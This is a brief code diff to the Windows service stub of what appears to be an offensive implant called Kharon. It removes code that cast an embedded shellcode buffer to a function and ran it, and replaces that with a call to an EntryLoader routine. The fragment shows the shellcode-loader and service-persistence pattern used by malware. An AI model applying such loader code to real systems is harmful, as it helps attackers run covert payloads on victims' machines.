@@ -1,5 +1,4 @@
 #include <Kharon.h>
-#include <Shellcode.h>
 
 SERVICE_STATUS              ServiceStatus       = {0};
 SERVICE_STATUS_HANDLE       ServiceStatusHandle = NULL;
@@ -27,11 +26,7 @@ VOID WINAPI ServiceCtrlHandler( ULONG Ctrl ) {
 }
 
 VOID RunKharon( VOID ) {
-    VOID(*Kharon)(VOID) = (decltype(Kharon))Shellcode::Data;
-
-    if ( Kharon ) {
-        Kharon();
-    }
+    EntryLoader();
 }
 
 VOID WINAPI ServiceMain( DWORD argc, LPWSTR *argv ) {
